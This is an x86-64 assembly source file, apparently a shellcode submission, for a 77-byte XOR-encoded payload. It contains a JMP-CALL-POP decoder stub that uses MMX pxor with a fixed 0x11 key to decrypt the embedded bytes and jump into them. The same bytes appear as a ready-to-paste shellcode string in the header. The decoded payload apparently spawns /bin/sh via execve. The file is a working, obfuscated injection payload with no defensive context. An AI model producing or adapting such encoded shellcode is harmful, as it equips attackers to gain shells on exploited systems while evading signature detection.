; Author: Robert C. Raducioiu
; Shellcode: xeb\x1e\x5f\x48\x89\xfe\x48\x83\xc7\x08\x31\xc9\x83\xc1\x04\x0f\x6f\x07\x0f\xef\x06\x0f\x7f\x07\x48\x83\xc7\x08\xe2\xf1\xeb\x0d\xe8\xdd\xff\xff\xff\x11\x11\x11\x11\x11\x11\x11\x11\x20\xd1\x41\x59\x98\xf3\x59\xaa\x3e\x73\x78\x7f\x3e\x3e\x62\x79\x42\x59\x98\xf6\x41\x46\x59\x98\xf7\x92\xd1\x2a\x1e\x14\x11\x11";
; Length: 77 bytes

global _start

section .text

_start:

    jmp short CallDecodeShellcode

DecodeShellcode:

    pop rdi
    mov rsi, rdi
    add rdi, 8

    xor ecx, ecx
    add ecx, 4

DecodeChunk:

    movq mm0, [rdi]
    pxor mm0, [rsi]

    movq [rdi], mm0

    add rdi, 8
    loop DecodeChunk

    jmp short EncryptedShellcode

CallDecodeShellcode:

    call DecodeShellcode
    EncryptionKey: db 0x11,0x11,0x11,0x11,0x11,0x11,0x11,0x11
    EncryptedShellcode: db 0x20,0xd1,0x41,0x59,0x98,0xf3,0x59,0xaa,0x3e,0x73,0x78,0x7f,0x3e,0x3e,0x62,0x79,0x42,0x59,0x98,0xf6,0x41,0x46,0x59,0x98,0xf7,0x92,0xd1,0x2a,0x1e,0x14,0x11,0x11
